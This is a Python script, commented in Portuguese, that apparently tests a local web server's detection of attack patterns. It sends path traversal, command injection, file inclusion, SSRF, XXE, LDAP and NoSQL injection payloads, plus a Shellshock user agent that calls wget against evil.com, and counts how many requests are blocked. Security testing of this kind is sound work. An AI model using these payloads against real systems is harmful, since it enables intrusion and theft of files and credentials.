"""
Script de Ataque Controlado - Path Traversal & Suspicious Patterns
Testa a detecção de padrões suspeitos e path traversal
"""

import requests
import time
from typing import List
import argparse

BASE_URL = "http://localhost:3000"

# Payloads de Path Traversal e padrões suspeitos
SUSPICIOUS_PAYLOADS = [
    # Path Traversal
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\config\\sam",
    "....//....//....//etc/passwd",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    
    # Command Injection
    "; ls -la",
    "| cat /etc/passwd",
    "& whoami",
    "`id`",
    "$(uname -a)",
    
    # File Inclusion
    "php://filter/convert.base64-encode/resource=index.php",
    "file:///etc/passwd",
    "expect://id",
    
    # SSRF
    "http://localhost:22",
    "http://127.0.0.1:3306",
    "http://169.254.169.254/latest/meta-data/",
    
    # Directory Listing
    "/admin/",
    "/.git/config",
    "/.env",
    "/backup.sql",
    "/database.sql",
    
    # Source Code Disclosure
    ".php.bak",
    "index.php~",
    ".DS_Store",
    
    # XXE
    "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>",
    
    # LDAP Injection
    "*)(uid=*))(|(uid=*",
    "admin*",
    "*",
    
    # NoSQL Injection
    "{'$gt': ''}",
    "[$ne]=1",
]


def test_suspicious_patterns_honeypot(payloads: List[str], delay: float = 0):
    """
    Testa padrões suspeitos nos honeypots
    """
    honeypots = ["/admin", "/debug", "/.env", "/db"]
    
    print(f"\n🟡 Testando Padrões Suspeitos - Honeypot Endpoints")
    print(f"   Payloads: {len(payloads)} x {len(honeypots)} endpoints\n")
    
    results = {
        "total_attempts": 0,
        "blocked": 0,
        "errors": 0,
    }

    for endpoint in honeypots:
        for idx, payload in enumerate(payloads, 1):
            try:
                results["total_attempts"] += 1

                # Testa com payload no path
                response = requests.get(
                    f"{BASE_URL}{endpoint}/{payload}",
                    timeout=5,
                )

                if response.status_code == 403:
                    results["blocked"] += 1
                    status = "🛡️  BLOCKED"
                elif response.status_code < 500:
                    status = "⚠️  NOT BLOCKED"
                else:
                    status = "❌ ERROR"
                    results["errors"] += 1

                print(f"   [{idx:2d}/{len(payloads)}] {endpoint:10s} | {status} | {payload[:30]}")
                
                time.sleep(delay)

            except requests.exceptions.Timeout:
                results["errors"] += 1
                print(f"   [{idx:2d}/{len(payloads)}] {endpoint:10s} | ⏱️  TIMEOUT")
            except Exception as e:
                results["errors"] += 1
                print(f"   [{idx:2d}/{len(payloads)}] {endpoint:10s} | ❌ {str(e)[:40]}")

    return results


def test_suspicious_query_params(payloads: List[str], delay: float = 0):
    """
    Testa padrões suspeitos em query parameters
    """
    endpoint = f"{BASE_URL}/admin"
    
    print(f"\n🟡 Testando Padrões Suspeitos - Query Parameters")
    print(f"   Payloads: {len(payloads)}\n")
    
    results = {
        "total_attempts": 0,
        "blocked": 0,
        "errors": 0,
    }

    for idx, payload in enumerate(payloads, 1):
        try:
            results["total_attempts"] += 1

            # Testa em diferentes parâmetros
            response = requests.get(
                endpoint,
                params={
                    "file": payload,
                    "path": payload,
                    "page": payload,
                },
                timeout=5,
            )

            if response.status_code == 403:
                results["blocked"] += 1
                status = "🛡️  BLOCKED"
            elif response.status_code < 500:
                status = "⚠️  NOT BLOCKED"
            else:
                status = "❌ ERROR"
                results["errors"] += 1

            print(f"   [{idx:2d}/{len(payloads)}] Query params | {status} | {payload[:30]}")
            
            time.sleep(delay)

        except requests.exceptions.Timeout:
            results["errors"] += 1
            print(f"   [{idx:2d}/{len(payloads)}] Query params | ⏱️  TIMEOUT")
        except Exception as e:
            results["errors"] += 1
            print(f"   [{idx:2d}/{len(payloads)}] Query params | ❌ {str(e)[:40]}")

    return results


def test_user_agent_manipulation(delay: float = 0):
    """
    Testa manipulação de User-Agent suspeitos
    """
    suspicious_agents = [
        "sqlmap/1.0",
        "nikto/2.1.6",
        "Nmap Scripting Engine",
        "() { :;}; /bin/bash -c 'wget http://evil.com'",
        "<script>alert(1)</script>",
    ]
    
    endpoint = f"{BASE_URL}/admin"
    
    print(f"\n🟡 Testando User-Agent Suspeitos")
    print(f"   Agents: {len(suspicious_agents)}\n")
    
    results = {
        "total_attempts": 0,
        "blocked": 0,
        "errors": 0,
    }

    for idx, agent in enumerate(suspicious_agents, 1):
        try:
            results["total_attempts"] += 1

            response = requests.get(
                endpoint,
                headers={"User-Agent": agent},
                timeout=5,
            )

            if response.status_code == 403:
                results["blocked"] += 1
                status = "🛡️  BLOCKED"
            else:
                status = "⚠️  NOT BLOCKED"

            print(f"   [{idx:2d}/{len(suspicious_agents)}] {status} | {agent[:40]}")
            
            time.sleep(delay)

        except requests.exceptions.Timeout:
            results["errors"] += 1
            print(f"   [{idx:2d}/{len(suspicious_agents)}] ⏱️  TIMEOUT")
        except Exception as e:
            results["errors"] += 1
            print(f"   [{idx:2d}/{len(suspicious_agents)}] ❌ {str(e)[:40]}")

    return results


def print_summary(results: dict):
    """
    Exibe resumo dos resultados
    """
    print("\n" + "=" * 50)
    print("📊 RESUMO DO ATAQUE - PADRÕES SUSPEITOS")
    print("=" * 50)
    print(f"Total de Tentativas: {results['total_attempts']}")
    print(f"Bloqueadas:          {results['blocked']}")
    print(f"Erros:               {results['errors']}")
    
    if results['total_attempts'] > 0:
        block_rate = (results['blocked'] / results['total_attempts']) * 100
        print(f"\nTaxa de Bloqueio:    {block_rate:.1f}%")
    
    print("=" * 50 + "\n")


def main():
    parser = argparse.ArgumentParser(
        description="Testa detecção de padrões suspeitos"
    )
    parser.add_argument(
        "--mode",
        choices=["all", "honeypot", "query", "useragent"],
        default="all",
        help="Modo de teste (padrão: all)",
    )
    parser.add_argument(
        "--delay",
        type=float,
        default=0,
        help="Delay entre requisições em segundos (padrão: 0 - sem delay)",
    )
    parser.add_argument(
        "--count",
        type=int,
        help="Número de payloads a usar (padrão: todos)",
    )

    args = parser.parse_args()

    payloads = SUSPICIOUS_PAYLOADS[: args.count] if args.count else SUSPICIOUS_PAYLOADS

    print("\n" + "=" * 50)
    print("🎯 SUSPICIOUS PATTERNS ATTACK SIMULATOR")
    print("=" * 50)
    print(f"Target: {BASE_URL}")
    print(f"Mode:   {args.mode}")
    print(f"Delay:  {args.delay}s")
    print("=" * 50)

    all_results = {
        "total_attempts": 0,
        "blocked": 0,
        "errors": 0,
    }

    try:
        if args.mode in ["all", "honeypot"]:
            results = test_suspicious_patterns_honeypot(payloads, args.delay)
            all_results["total_attempts"] += results["total_attempts"]
            all_results["blocked"] += results["blocked"]
            all_results["errors"] += results["errors"]

        if args.mode in ["all", "query"]:
            results = test_suspicious_query_params(payloads, args.delay)
            all_results["total_attempts"] += results["total_attempts"]
            all_results["blocked"] += results["blocked"]
            all_results["errors"] += results["errors"]

        if args.mode in ["all", "useragent"]:
            results = test_user_agent_manipulation(args.delay)
            all_results["total_attempts"] += results["total_attempts"]
            all_results["blocked"] += results["blocked"]
            all_results["errors"] += results["errors"]

        print_summary(all_results)

    except KeyboardInterrupt:
        print("\n\n⚠️  Ataque interrompido pelo usuário")
        print_summary(all_results)


if __name__ == "__main__":
    main()
